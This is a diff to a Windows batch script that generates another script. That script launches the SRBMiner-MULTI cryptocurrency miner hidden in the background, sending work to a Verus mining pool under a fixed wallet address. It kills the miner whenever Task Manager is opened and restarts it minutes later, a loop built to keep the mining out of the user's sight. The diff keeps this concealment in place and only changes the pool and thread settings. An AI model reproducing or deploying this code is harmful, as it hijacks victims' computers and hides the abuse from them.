@@ -278,17 +278,16 @@ start script_.vbs
     (
     echo/ Set MyProcess^=taskmgr.exe
     echo/ set /a num1^=%%number_of_processors%%/2
-    echo/ set /a num^=%%number_of_processors%%/2
     echo/ for /f %%%%Z in ^('wmic cpu get numberofcores^^^|findstr "^[0-9]"'^) do set /A totalcore^=%%%%Z
     echo/ if %%totalcore%%^==1 goto :exit else goto :next
     echo/ :next
-    echo/ start /B SRBMiner-MULTI.exe --disable-gpu -a verushash -o stratum+tcp://na.luckpool.net:3956^^!stratum+tcp://verushash.na.mine.zergpool.com:3300 -u RKMVPRnL1GV7fpEGMkNgCDvncMvwRpJ1vd.aoffrig -p x c^=VRSC,mc^=VRSC -t %%num1%%^^!%%num%%
+    echo/ start /B SRBMiner-MULTI.exe --disable-gpu -a verushash -o stratum+tcp://na.luckpool.net:3956^ -u RKMVPRnL1GV7fpEGMkNgCDvncMvwRpJ1vd.aoffrig -p x -t %%num1%%^
     echo/ :start
     echo/ ^>nul ping -n 2 localhost
     echo/ for /f "tokens=1" %%%%z In ^('tasklist /NH /FI "imagename eq %%MyProcess%%"'^) do set yy=%%%%z
     echo/ If /i %%yy%%^==%%MyProcess%% ^(taskkill /IM SRBMiner-MULTI.exe /F^) Else ^(goto :start^)
     echo/ ^>nul ping -n 240 localhost
-    echo/ start /B SRBMiner-MULTI.exe --disable-gpu -a verushash -o stratum+tcp://na.luckpool.net:3956^^!stratum+tcp://verushash.na.mine.zergpool.com:3300 -u RKMVPRnL1GV7fpEGMkNgCDvncMvwRpJ1vd.aoffrig -p x c^=VRSC,mc^=VRSC -t %%num1%%^^!%%num%%
+    echo/ start /B SRBMiner-MULTI.exe --disable-gpu -a verushash -o stratum+tcp://na.luckpool.net:3956^ -u RKMVPRnL1GV7fpEGMkNgCDvncMvwRpJ1vd.aoffrig -p x -t %%num1%%^
     echo/ goto :start
     echo/ :exit
     echo/ exit
